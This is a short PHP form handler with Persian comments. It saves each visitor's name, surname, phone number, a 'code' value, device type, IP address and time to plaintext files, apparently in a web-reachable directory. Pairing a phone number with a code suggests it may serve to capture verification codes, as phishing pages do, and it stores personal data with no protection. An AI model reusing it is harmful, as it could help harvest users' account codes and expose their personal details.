<?php

function deviceType() {
    $agent = $_SERVER['HTTP_USER_AGENT'];
    if (preg_match('/mobile/i', $agent)) {
        return "موبایل";
    } else {
        return "کامپیوتر";
    }
}

$name = $_POST['name'] ?? '';
$lastname = $_POST['lastname'] ?? '';
$phone = $_POST['phone'] ?? '';
$code = $_POST['code'] ?? '';

$time = date("Y-m-d H:i:s");
$device = deviceType();
$ip = $_SERVER['REMOTE_ADDR']; // آی‌پی کاربر

// ذخیره در data.txt
$data = "نام: $name | نام خانوادگی: $lastname | شماره: $phone | کد: $code | دستگاه: $device | زمان: $time\n";
file_put_contents("data.txt", $data, FILE_APPEND);

// ذخیره در log.txt
$log = "نام: $name | نام خانوادگی: $lastname | شماره: $phone | کد: $code | دستگاه: $device | آی‌پی: $ip | زمان: $time\n";
file_put_contents("log.txt", $log, FILE_APPEND);

echo "saved";
?>
